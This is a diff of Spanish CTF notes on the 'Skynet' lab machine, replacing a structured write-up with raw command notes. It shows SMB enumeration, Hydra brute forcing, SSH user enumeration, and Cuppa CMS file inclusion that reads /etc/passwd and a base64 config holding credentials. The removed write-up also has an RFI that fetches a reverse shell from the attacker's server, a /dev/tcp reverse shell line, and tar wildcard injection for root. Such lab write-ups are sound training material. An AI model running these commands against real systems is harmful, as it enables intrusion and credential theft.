@@ -1591,527 +1591,186 @@ esperamos
 
 echo %Username% y veremos usuario administrador</rich_text>
     </node>
-    <node unique_id="45" master_id="0" name="Skynet" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1764435976" ts_lastsave="1764435983">
-      <rich_text scale="small">
-Notas de Pentesting - Skynet CTF
+    <node unique_id="45" master_id="0" name="Skynet" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1764435976" ts_lastsave="1778951629">
+      <rich_text>sudo nmap -sV --top-ports 1000 10.64.181.36
+sudo: unable to resolve host ip-10-64-114-253: Name or service not known
+Starting Nmap 7.80 ( </rich_text>
+      <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+      <rich_text> ) at 2026-05-14 15:37 BST
+mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 10.64.181.36
+Host is up (0.00030s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+110/tcp open  pop3        Dovecot pop3d
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-📋 Resumen
-Penetración completa de una máquina Linux (Ubuntu) llamada "SKYNET" utilizando enumeración SMB, fuerza bruta web, explotación RFI en Cuppa CMS y escalada de privilegios vía tar wildcard injection.
-
-🔍 Fase 1: Reconocimiento y Enumeración
-
-Escaneo de Puertos con Nmap
-</rich_text>
-      <rich_text scale="small" weight="heavy">Comando:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">sudo nmap -sV -Pn 10.80.175.202
-</rich_text>
-      <rich_text scale="small" weight="heavy">Parámetros:</rich_text>
-      <rich_text scale="small">
-• </rich_text>
-      <rich_text family="monospace" scale="small">-sV</rich_text>
-      <rich_text scale="small">: Detección de versiones de servicios
-• </rich_text>
-      <rich_text family="monospace" scale="small">-Pn</rich_text>
-      <rich_text scale="small">: Skip ping (asume que el host está activo)
-
-</rich_text>
-      <rich_text scale="small" weight="heavy">Puertos Abiertos Encontrados:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text justification="left" scale="small"></rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text scale="small" weight="heavy">Información del Sistema:</rich_text>
-      <rich_text scale="small">
-◇ Host: SKYNET
-◇ OS: Linux (Ubuntu)
-◇ Workgroup: WORKGROUP
+Service detection performed. Please report any incorrect results at </rich_text>
+      <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+      <rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 12.00 seconds
 
 
-📁 Fase 2: Enumeración SMB
+smbclient -L 10.64.181.36
+smbclient -N //10.64.181.36/Anonymous
 
-Escaneo de Recursos Compartidos
-</rich_text>
-      <rich_text scale="small" weight="heavy">Comando:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">smbmap -H 10.80.175.202
-</rich_text>
-      <rich_text scale="small" weight="heavy">¿Qué hace?</rich_text>
-      <rich_text scale="small"> Enumera recursos compartidos SMB y sus permisos sin credenciales (guest session).
-</rich_text>
-      <rich_text scale="small" weight="heavy">Recursos Encontrados:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">print$</rich_text>
-      <rich_text scale="small"> - NO ACCESS
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">anonymous</rich_text>
-      <rich_text scale="small"> - </rich_text>
-      <rich_text scale="small" weight="heavy">READ ONLY</rich_text>
-      <rich_text scale="small"> (¡Interesante!)
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">milesdyson</rich_text>
-      <rich_text scale="small"> - NO ACCESS
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">IPC$</rich_text>
-      <rich_text scale="small"> - NO ACCESS
+smbclient -L 10.64.181.36 -p 139
 
 
-Acceso al Recurso Anonymous
-</rich_text>
-      <rich_text scale="small" weight="heavy">Listar recursos:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">smbclient -L //10.80.175.202 -N
-</rich_text>
-      <rich_text scale="small" weight="heavy">Conectar al recurso:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">smbclient //10.80.175.202/anonymous -N
-</rich_text>
-      <rich_text scale="small" weight="heavy">Parámetros:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-L</rich_text>
-      <rich_text scale="small">: Lista recursos compartidos
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-N</rich_text>
-      <rich_text scale="small">: Sin contraseña (null session)
+gobuster dir -u </rich_text>
+      <rich_text link="webs http://10.64.181.36">http://10.64.181.36</rich_text>
+      <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     </rich_text>
+      <rich_text link="webs http://10.64.181.36">http://10.64.181.36</rich_text>
+      <rich_text>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 312] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.181.36/admin/]">http://10.64.181.36/admin/]</rich_text>
+      <rich_text>
+/css                  (Status: 301) [Size: 310] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.181.36/css/]">http://10.64.181.36/css/]</rich_text>
+      <rich_text>
+/js                   (Status: 301) [Size: 309] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.181.36/js/]">http://10.64.181.36/js/]</rich_text>
+      <rich_text>
+/config               (Status: 301) [Size: 313] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.181.36/config/]">http://10.64.181.36/config/]</rich_text>
+      <rich_text>
+/ai                   (Status: 301) [Size: 309] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.181.36/ai/]">http://10.64.181.36/ai/]</rich_text>
+      <rich_text>
+/squirrelmail         (Status: 301) [Size: 319] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.181.36/squirrelmail/]">http://10.64.181.36/squirrelmail/]</rich_text>
+      <rich_text>
+Progress: 87664 / 87665 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+vamos a </rich_text>
+      <rich_text link="webs http://10.64.181.36/squirrelmail/">http://10.64.181.36/squirrelmail/</rich_text>
+      <rich_text>
+
+buscamos </rich_text>
+      <rich_text link="webs https://www.exploit-db.com/exploits/40136">https://www.exploit-db.com/exploits/40136</rich_text>
+      <rich_text>
+instalamos paramiko y numpy
+
+hydra -l milesdyson -P log1.txt 10.66.128.150 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:F=Unknown user or password incorrect" -f -V
+
+/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
+
+buscamos </rich_text>
+      <rich_text link="webs https://www.exploit-db.com/exploits/40136">https://www.exploit-db.com/exploits/40136</rich_text>
+      <rich_text>
+instalamos paramiko y numpy
+
+python file.py 10.64.181.36 -U /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
+/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+  from cryptography.hazmat.backends import default_backend
+
+User name enumeration against SSH daemons affected by CVE-2016-6210
+Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari
+
+[*] Testing SSHD at: 10.64.181.36:22, Banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
+[*] Getting baseline timing for authenticating non-existing users............
+[*] Baseline mean for host 10.64.181.36 is 0.007091500000000017 seconds.
+[*] Baseline variation for host 10.64.181.36 is 0.0009952358765639485 seconds.
+[*] Defining timing of x &lt; 0.010077207629691862 as non-existing user.
+[*] Testing your users...
+[-] root - timing: 0.009887000000000035
+[-] admin - timing: 0.007267999999999997
+[-] test - timing: 0.006353999999999971
+[-] guest - timing: 0.007996000000000003
+[-] info - timing: 0.0059499999999999
+[-] adm - timing: 0.008321000000000023
+[-] mysql - timing: 0.007526000000000033
+[-] user - timing: 0.008326999999999973
+[-] administrator - timing: 0.0071350000000000025
+[-] oracle - timing: 0.005720999999999976
+[-] ftp - timing: 0.007776000000000005
+[-] pi - timing: 0.010010000000000074
+[-] puppet - timing: 0.007578999999999891
+[-] ansible - timing: 0.007695000000000007
+[-] ec2-user - timing: 0.006366000000000094
+[-] vagrant - timing: 0.006790000000000074
+[+] azureuser - timing: 0.010785000000000045
+root@ip-10-64-114-253:~# 
+
+la contraseña es: )s{A&amp;2Z=F^n_E.B`
+smbclient -N //10.66.128.150/milesdyson -U 'milesdyson'%')s{A&amp;2Z=F^n_E.B`'
+cd notes
+get important.txt
+cat important.txt
+/45kra24zxs28v3yd
+
+acceder a </rich_text>
+      <rich_text link="webs http://10.66.128.150/45kra24zxs28v3yd">http://10.66.128.150/45kra24zxs28v3yd</rich_text>
+      <rich_text>
+
+gobuster dir -u </rich_text>
+      <rich_text link="webs http://10.66.128.150/45kra24zxs28v3yd">http://10.66.128.150/45kra24zxs28v3yd</rich_text>
+      <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     </rich_text>
+      <rich_text link="webs http://10.66.128.150/45kra24zxs28v3yd">http://10.66.128.150/45kra24zxs28v3yd</rich_text>
+      <rich_text>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/administrator        (Status: 301) [Size: 339] [--&gt; </rich_text>
+      <rich_text link="webs http://10.66.128.150/45kra24zxs28v3yd/administrator/]">http://10.66.128.150/45kra24zxs28v3yd/administrator/]</rich_text>
+      <rich_text>
+Progress: 87664 / 87665 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+buscamos Cuppa en internet y probamos el exploit
+curl "</rich_text>
+      <rich_text link="webs http://10.66.128.150/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://10.66.128.150/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</rich_text>
+      <rich_text>"
 
 </rich_text>
-      <rich_text scale="small" weight="heavy">Archivos encontrados:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">attention.txt</rich_text>
-      <rich_text scale="small">
-◇ Directorio </rich_text>
-      <rich_text family="monospace" scale="small">logs/</rich_text>
-      <rich_text scale="small"> con archivos que contienen </rich_text>
-      <rich_text scale="small" weight="heavy">usuarios</rich_text>
-      <rich_text scale="small">
+      <rich_text link="webs http://10.66.128.150/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php">http://10.66.128.150/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</rich_text>
+      <rich_text>
 
 </rich_text>
-      <rich_text scale="small" weight="heavy">Comandos útiles dentro de smbclient:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">smb: \&gt; ls                    # Listar archivos
-smb: \&gt; cd logs               # Cambiar directorio
-smb: \&gt; get archivo.txt       # Descargar archivo
-smb: \&gt; mget *                # Descargar todo
-</rich_text>
-      <rich_text scale="small">
-🌐 Fase 3: Enumeración Web
+      <rich_text link="webs http://10.66.128.150/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php">http://10.66.128.150/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</rich_text>
+      <rich_text>
 
-Fuzzing de Directorios con Gobuster
-</rich_text>
-      <rich_text scale="small" weight="heavy">Comando:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">gobuster dir -u http://10.80.175.202 -w /usr/share/wordlists/dirb/common.txt -q -e -t 50
-</rich_text>
-      <rich_text scale="small" weight="heavy">Parámetros:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">dir</rich_text>
-      <rich_text scale="small">: Modo de fuerza bruta de directorios
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-u</rich_text>
-      <rich_text scale="small">: URL objetivo
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-w</rich_text>
-      <rich_text scale="small">: Wordlist a usar
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-q</rich_text>
-      <rich_text scale="small">: Modo silencioso (menos output)
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-e</rich_text>
-      <rich_text scale="small">: Mostrar URLs completas
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-t 50</rich_text>
-      <rich_text scale="small">: 50 hilos (más rápido)
+PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gInBhc3N3b3JkMTIzIjsKCQlwdWJsaWMgJHRhYmxlX3ByZWZpeCA9ICJjdV8iOwoJCXB1YmxpYyAkYWRtaW5pc3RyYXRvcl90ZW1wbGF0ZSA9ICJkZWZhdWx0IjsKCQlwdWJsaWMgJGxpc3RfbGltaXQgPSAyNTsKCQlwdWJsaWMgJHRva2VuID0gIk9CcUlQcWxGV2YzWCI7CgkJcHVibGljICRhbGxvd2VkX2V4dGVuc2lvbnMgPSAiKi5ibXA7ICouY3N2OyAqLmRvYzsgKi5naWY7ICouaWNvOyAqLmpwZzsgKi5qcGVnOyAqLm9kZzsgKi5vZHA7ICoub2RzOyAqLm9kdDsgKi5wZGY7ICoucG5nOyAqLnBwdDsgKi5zd2Y7ICoudHh0OyAqLnhjZjsgKi54bHM7ICouZG9jeDsgKi54bHN4IjsKCQlwdWJsaWMgJHVwbG9hZF9kZWZhdWx0X3BhdGggPSAibWVkaWEvdXBsb2Fkc0ZpbGVzIjsKCQlwdWJsaWMgJG1heGltdW1fZmlsZV9zaXplID0gIjUyNDI4ODAiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luID0gMDsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbl92YWx1ZSA9ICIiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gIiI7Cgl9IAo/Pg== 
+
+decodificamos y accedemos por ssh
 
 </rich_text>
-      <rich_text scale="small" weight="heavy">Directorios Encontrados:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">/admin</rich_text>
-      <rich_text scale="small"> (301)
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">/config</rich_text>
-      <rich_text scale="small"> (301)
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">/css</rich_text>
-      <rich_text scale="small"> (301)
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">/js</rich_text>
-      <rich_text scale="small"> (301)
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">/squirrelmail</rich_text>
-      <rich_text scale="small"> (301) ⚠️ </rich_text>
-      <rich_text scale="small" weight="heavy">¡Cliente de correo web!</rich_text>
-      <rich_text scale="small">
-
-
-Acceso a SquirrelMail
-</rich_text>
-      <rich_text scale="small" weight="heavy">URL:</rich_text>
-      <rich_text scale="small"> </rich_text>
-      <rich_text family="monospace" scale="small">http://10.80.175.202/squirrelmail/</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text scale="small" weight="heavy">Hallazgo:</rich_text>
-      <rich_text scale="small"> Correo de restablecimiento de contraseña con credenciales en texto plano.
-</rich_text>
-      <rich_text scale="small" weight="heavy">Credenciales obtenidas:</rich_text>
-      <rich_text scale="small">
-◇ Usuario: </rich_text>
-      <rich_text family="monospace" scale="small">milesdyson</rich_text>
-      <rich_text scale="small">
-◇ Contraseña: `)s{A&amp;2Z=F^n_E.B``
-
-
-🔐 Fase 4: Acceso SMB Autenticado
-
-Validar Credenciales con CrackMapExec
-</rich_text>
-      <rich_text scale="small" weight="heavy">Comando:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">crackmapexec smb 10.80.175.202 -u milesdyson -p ')s{A&amp;2Z=F^n_E.B`' -d .
-</rich_text>
-      <rich_text scale="small" weight="heavy">¿Qué hace?</rich_text>
-      <rich_text scale="small"> Valida credenciales SMB contra el objetivo.
-</rich_text>
-      <rich_text scale="small" weight="heavy">Parámetros:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-u</rich_text>
-      <rich_text scale="small">: Usuario
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-p</rich_text>
-      <rich_text scale="small">: Contraseña
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-d .</rich_text>
-      <rich_text scale="small">: Dominio (. = local)
-
-
-Conectar al Recurso Personal
-</rich_text>
-      <rich_text scale="small" weight="heavy">Comando:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">smbclient //10.80.175.202/milesdyson -U milesdyson
-# Password: )s{A&amp;2Z=F^n_E.B`
-</rich_text>
-      <rich_text scale="small" weight="heavy">Archivo crítico encontrado:</rich_text>
-      <rich_text scale="small"> </rich_text>
-      <rich_text family="monospace" scale="small">notes/important.txt</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text scale="small" weight="heavy">Contenido:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">1. Add features to beta CMS /45kra24zxs28v3yd
-2. Work on T-800 Model 101 blueprints
-3. Spend more time with my wife
-</rich_text>
-      <rich_text scale="small" weight="heavy">🎯 Ruta del CMS descubierta:</rich_text>
-      <rich_text scale="small"> </rich_text>
-      <rich_text family="monospace" scale="small">/45kra24zxs28v3yd</rich_text>
-      <rich_text scale="small">
-
-🚀 Fase 5: Explotación del CMS
-
-Fuzzing del CMS
-</rich_text>
-      <rich_text scale="small" weight="heavy">Comando:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">gobuster dir -u http://10.80.175.202/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt -q -e -t 50
-</rich_text>
-      <rich_text scale="small" weight="heavy">Directorio clave:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">/administrator</rich_text>
-      <rich_text scale="small"> → </rich_text>
-      <rich_text scale="small" weight="heavy">Cuppa CMS</rich_text>
-      <rich_text scale="small">
-
-
-Vulnerabilidad: Remote File Inclusion (RFI)
-</rich_text>
-      <rich_text scale="small" weight="heavy">CMS Identificado:</rich_text>
-      <rich_text scale="small"> Cuppa CMS
- </rich_text>
-      <rich_text scale="small" weight="heavy">Vulnerabilidad:</rich_text>
-      <rich_text scale="small"> Remote File Inclusion en </rich_text>
-      <rich_text family="monospace" scale="small">alertConfigField.php</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text scale="small" weight="heavy">CVE/Exploit:</rich_text>
-      <rich_text scale="small"> Cuppa CMS - 'alertConfigField.php' Local/Remote File Inclusion
-
-Preparar Servidor HTTP
-</rich_text>
-      <rich_text scale="small" weight="heavy">Comando:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">python3 -m http.server 9000
-</rich_text>
-      <rich_text scale="small" weight="heavy">¿Por qué?</rich_text>
-      <rich_text scale="small"> Para servir nuestra reverse shell al servidor vulnerable.
-
-Prueba de RFI (Lectura de /etc/passwd)
-</rich_text>
-      <rich_text scale="small" weight="heavy">URL:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">http://10.80.175.202/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
-</rich_text>
-      <rich_text scale="small">
-Reverse Shell
-</rich_text>
-      <rich_text scale="small" weight="heavy">1. Preparar reverse shell:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small"># Copiar php-reverse-shell.php de /usr/share/webshells/php/
-# Modificar IP y puerto
-</rich_text>
-      <rich_text scale="small" weight="heavy">2. Iniciar listener:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">nc -lvnp 6666
-</rich_text>
-      <rich_text scale="small" weight="heavy">3. Ejecutar RFI:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">http://10.80.175.202/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.64.123.196:9000/php-reverse-shell.php
-</rich_text>
-      <rich_text scale="small">
-🔧 Fase 6: Post-Explotación
-
-Mejorar la Shell
-</rich_text>
-      <rich_text scale="small" weight="heavy">Comando:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">python -c 'import pty; pty.spawn("/bin/bash")'
-</rich_text>
-      <rich_text scale="small" weight="heavy">¿Por qué?</rich_text>
-      <rich_text scale="small"> Obtenemos una shell TTY interactiva con mejores funcionalidades.
-</rich_text>
-      <rich_text scale="small" weight="heavy">Comandos adicionales para shell completa:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">export TERM=xterm
-# Ctrl+Z para suspender
-stty raw -echo; fg
-# Enter dos veces
-</rich_text>
-      <rich_text scale="small">
-👑 Fase 7: Escalada de Privilegios
-
-Técnica: Tar Wildcard Injection
-</rich_text>
-      <rich_text scale="small" weight="heavy">Concepto:</rich_text>
-      <rich_text scale="small"> Tar ejecutado como root con checkpoint malicioso.
-
-Crear Script Malicioso
-</rich_text>
-      <rich_text scale="small" weight="heavy">1. Crear script root.sh:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt; root.sh
-chmod +x root.sh
-</rich_text>
-      <rich_text scale="small" weight="heavy">O crear reverse shell:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">printf '#!/bin/bash\nsh -i &gt;&amp; /dev/tcp/10.64.123.196/6666 0&gt;&amp;1' &gt; /var/www/html/shell
-chmod +x /var/www/html/shell
-</rich_text>
-      <rich_text scale="small">
-Crear Archivos Checkpoint
-</rich_text>
-      <rich_text scale="small" weight="heavy">Comandos:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">touch "$(pwd)/--checkpoint-action=exec=sh root.sh"
-touch /var/www/html/--checkpoint-action=exec=bash shell
-touch /var/www/html/--checkpoint=1
-</rich_text>
-      <rich_text scale="small" weight="heavy">¿Cómo funciona?</rich_text>
-      <rich_text scale="small">
-◇ Cuando </rich_text>
-      <rich_text family="monospace" scale="small">tar</rich_text>
-      <rich_text scale="small"> se ejecuta con </rich_text>
-      <rich_text family="monospace" scale="small">*</rich_text>
-      <rich_text scale="small"> (wildcard), interpreta estos archivos como parámetros
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">--checkpoint-action</rich_text>
-      <rich_text scale="small"> ejecuta comandos durante la ejecución de tar
-◇ Si hay un cronjob o proceso que ejecuta </rich_text>
-      <rich_text family="monospace" scale="small">tar</rich_text>
-      <rich_text scale="small"> como root, obtenemos ejecución privilegiada
-
-
-Obtener Root
-</rich_text>
-      <rich_text scale="small" weight="heavy">Si se creó rootbash:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">/tmp/rootbash -p
-</rich_text>
-      <rich_text scale="small" weight="heavy">Verificar privilegios:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">id
-whoami
-cat /root/root.txt
-</rich_text>
-      <rich_text scale="small">
-📚 Comandos de Referencia Rápida
-
-Enumeración
-</rich_text>
-      <rich_text family="monospace" scale="small"># Nmap completo
-nmap -sV -sC -p- -A &lt;IP&gt;
-
-# SMB enumeration
-enum4linux -a &lt;IP&gt;
-smbmap -H &lt;IP&gt;
-smbclient -L //&lt;IP&gt; -N
-
-# Fuzzing web
-gobuster dir -u http://&lt;IP&gt; -w &lt;wordlist&gt; -x php,txt,html -t 50
-ffuf -u http://&lt;IP&gt;/FUZZ -w &lt;wordlist&gt;
-</rich_text>
-      <rich_text scale="small">
-Explotación
-</rich_text>
-      <rich_text family="monospace" scale="small"># Listener
-nc -lvnp &lt;PORT&gt;
-
-# Python HTTP server
-python3 -m http.server &lt;PORT&gt;
-
-# Mejorar shell
-python -c 'import pty; pty.spawn("/bin/bash")'
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-script /dev/null -c bash
-</rich_text>
-      <rich_text scale="small">
-Escalada de Privilegios
-</rich_text>
-      <rich_text family="monospace" scale="small"># Buscar SUID
-find / -perm -4000 2&gt;/dev/null
-
-# Capabilities
-getcap -r / 2&gt;/dev/null
-
-# Cronjobs
-cat /etc/crontab
-ls -la /etc/cron*
-
-# Permisos sudo
-sudo -l
-</rich_text>
-      <rich_text scale="small">
-⚠️ Puntos Clave de Aprendizaje
-1. </rich_text>
-      <rich_text scale="small" weight="heavy">Siempre enumerar SMB</rich_text>
-      <rich_text scale="small"> - Recursos anonymous pueden tener información valiosa
-2. </rich_text>
-      <rich_text scale="small" weight="heavy">Leer TODOS los archivos descargados</rich_text>
-      <rich_text scale="small"> - Notas, logs, configuraciones
-3. </rich_text>
-      <rich_text scale="small" weight="heavy">Identificar CMS y versiones</rich_text>
-      <rich_text scale="small"> - Buscar exploits conocidos
-4. </rich_text>
-      <rich_text scale="small" weight="heavy">RFI requiere servidor web</rich_text>
-      <rich_text scale="small"> - Preparar </rich_text>
-      <rich_text family="monospace" scale="small">python3 -m http.server</rich_text>
-      <rich_text scale="small">
-5. </rich_text>
-      <rich_text scale="small" weight="heavy">Wildcard injection</rich_text>
-      <rich_text scale="small"> - Archivos con nombres de parámetros pueden ejecutar comandos
-6. </rich_text>
-      <rich_text scale="small" weight="heavy">Mejorar shells inmediatamente</rich_text>
-      <rich_text scale="small"> - Mejor interactividad y estabilidad
-
-🛡️ Recomendaciones de Seguridad
-◇ [ ] Deshabilitar acceso anonymous a SMB
-◇ [ ] No almacenar contraseñas en correos
-◇ [ ] Actualizar Cuppa CMS (vulnerable a RFI)
-◇ [ ] Sanitizar wildcards en comandos ejecutados por root
-◇ [ ] Implementar validación estricta de inputs en aplicaciones web
-◇ [ ] Usar principio de mínimo privilegio en cronjobs
-
-
-📖 Recursos Adicionales
-</rich_text>
-      <rich_text scale="small" weight="heavy">Herramientas:</rich_text>
-      <rich_text scale="small">
-◇ Nmap: https://nmap.org/
-◇ Gobuster: https://github.com/OJ/gobuster
-◇ SMBMap: https://github.com/ShawnDEvans/smbmap
-◇ CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec
-
-</rich_text>
-      <rich_text scale="small" weight="heavy">Exploits:</rich_text>
-      <rich_text scale="small">
-◇ ExploitDB: https://www.exploit-db.com/
-◇ GTFOBins (escalada): https://gtfobins.github.io/
-
-</rich_text>
-      <rich_text scale="small" weight="heavy">Wordlists:</rich_text>
-      <rich_text scale="small">
-◇ SecLists: https://github.com/danielmiessler/SecLists
-◇ Dirb wordlists: </rich_text>
-      <rich_text family="monospace" scale="small">/usr/share/wordlists/dirb/</rich_text>
-      <rich_text scale="small">
-
-</rich_text>
-      <table char_offset="487" justification="left" col_min="60" col_max="60" col_widths="0,0,0">
-        <row>
-          <cell>22</cell>
-          <cell>SSH</cell>
-          <cell>OpenSSH 7.2p2 Ubuntu</cell>
-        </row>
-        <row>
-          <cell>80</cell>
-          <cell>HTTP</cell>
-          <cell>Apache 2.4.18</cell>
-        </row>
-        <row>
-          <cell>110</cell>
-          <cell>POP3</cell>
-          <cell>Dovecot pop3d</cell>
-        </row>
-        <row>
-          <cell>139</cell>
-          <cell>NetBIOS-SSN</cell>
-          <cell>Samba smbd 3.X - 4.X</cell>
-        </row>
-        <row>
-          <cell>143</cell>
-          <cell>IMAP</cell>
-          <cell>Dovecot imapd</cell>
-        </row>
-        <row>
-          <cell>445</cell>
